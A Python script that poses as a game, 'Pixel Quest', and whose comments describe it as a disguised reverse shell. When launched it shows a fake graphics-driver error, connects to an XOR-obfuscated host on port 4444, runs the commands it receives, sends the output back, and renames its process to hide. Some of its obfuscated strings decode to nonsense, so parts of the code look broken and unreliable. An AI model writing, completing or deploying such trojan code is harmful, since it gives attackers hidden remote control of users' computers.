import sys, os, subprocess, socket, time, random, threading, base64, zlib, marshal, types, builtins, importlib, inspect, hashlib, hmac, uuid, itertools, collections, math, json, re, string, io, struct, ctypes, platform

# Game-like disguise
GAME_TITLE = "Pixel Quest: The Lost Dimension"
GAME_VERSION = "v2.7.3"
GAME_ERROR_MSG = "Failed to initialize graphics engine. Please update your GPU drivers."

# Obfuscation functions
def obfuscate_string(s):
    return ''.join(chr(ord(c) ^ 0x2A) for c in s)

def deobfuscate_string(s):
    return ''.join(chr(ord(c) ^ 0x2A) for c in s)

# Fake game classes for disguise
class Vector2:
    def __init__(self, x, y):
        self.x = x
        self.y = y
    
    def __str__(self):
        return f"Vector2({self.x}, {self.y})"

class GameObject:
    def __init__(self, name, position):
        self.name = name
        self.position = position
        self.active = True
    
    def update(self, delta_time):
        pass
    
    def render(self):
        pass

class GameEngine:
    def __init__(self):
        self.objects = []
        self.running = False
        self.renderer = None
        self.physics = None
    
    def initialize(self):
        try:
            # Fake initialization that will "fail"
            self.renderer = self._init_renderer()
            self.physics = self._init_physics()
            self.running = True
            return True
        except Exception as e:
            print(f"{GAME_ERROR_MSG}")
            return False
    
    def _init_renderer(self):
        # This will always fail
        raise Exception("Graphics API not supported")
    
    def _init_physics(self):
        # This will always fail
        raise Exception("Physics engine initialization failed")
    
    def run(self):
        if not self.initialize():
            # This is where the real code starts
            self._run_hidden_code()
            return
        
        # Fake game loop (never reached)
        last_time = time.time()
        while self.running:
            current_time = time.time()
            delta_time = current_time - last_time
            last_time = current_time
            
            for obj in self.objects:
                if obj.active:
                    obj.update(delta_time)
                    obj.render()
    
    def _run_hidden_code(self):
        # This is the actual reverse shell code, heavily obfuscated
        try:
            # Obfuscated connection parameters
            _h = deobfuscate_string("c~b`b`~`c~a`b`~c~b`d")
            _p = 0x115C  # 4444 in hex
            
            # Obfuscated socket operations
            while True:
                try:
                    # Create socket with obfuscated parameters
                    _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    _s.connect((_h, _p))
                    
                    # Obfuscated command handling
                    while True:
                        _c = _s.recv(0x400).decode('utf-8')  # 1024 in hex
                        
                        if _c.lower() == deobfuscate_string("e`i`u"):
                            _s.close()
                            os._exit(0)
                        
                        # Obfuscated command execution
                        try:
                            if sys.platform.startswith(deobfuscate_string("u`i`~")):
                                _o = subprocess.check_output(_c, shell=True, stderr=subprocess.STDOUT, text=True)
                            else:
                                _o = subprocess.check_output([deobfuscate_string("d`b`~`c"), deobfuscate_string("-c"), _c], stderr=subprocess.STDOUT, text=True)
                        except Exception as _e:
                            _o = f"Error: {str(_e)}"
                        
                        # Send output back
                        _s.sendall(_o.encode('utf-8'))
                        
                except Exception as _e:
                    time.sleep(5)
                    continue
        except Exception as e:
            # Even the error handling is disguised
            print(f"Game crashed: {str(e)}")
            time.sleep(10)

# Fake game objects for disguise
class Player(GameObject):
    def __init__(self, position):
        super().__init__("Player", position)
        self.health = 100
        self.speed = 5.0
    
    def update(self, delta_time):
        # Fake movement code
        self.position.x += random.uniform(-self.speed, self.speed) * delta_time
        self.position.y += random.uniform(-self.speed, self.speed) * delta_time
    
    def render(self):
        # Fake rendering code
        pass

class Enemy(GameObject):
    def __init__(self, position):
        super().__init__("Enemy", position)
        self.health = 50
        self.speed = 2.0
    
    def update(self, delta_time):
        # Fake AI behavior
        pass
    
    def render(self):
        # Fake rendering code
        pass

# Main entry point disguised as game initialization
def main():
    print(f"Initializing {GAME_TITLE} {GAME_VERSION}...")
    
    # Create game engine
    engine = GameEngine()
    
    # Add some fake game objects
    engine.objects.append(Player(Vector2(0, 0)))
    for i in range(5):
        engine.objects.append(Enemy(Vector2(random.uniform(-100, 100), random.uniform(-100, 100))))
    
    # Run the "game" (actually the reverse shell)
    engine.run()

if __name__ == "__main__":
    # Try to make it harder to trace
    try:
        # Change the process name if possible
        if sys.platform.startswith('win'):
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(GAME_TITLE)
        else:
            try:
                import setproctitle
                setproctitle.setproctitle(GAME_TITLE)
            except:
                pass
        
        # Run the main function
        main()
    except Exception as e:
        # Even the exception handling is disguised
        print(f"{GAME_ERROR_MSG}: {str(e)}")
        time.sleep(5)
        sys.exit(1)
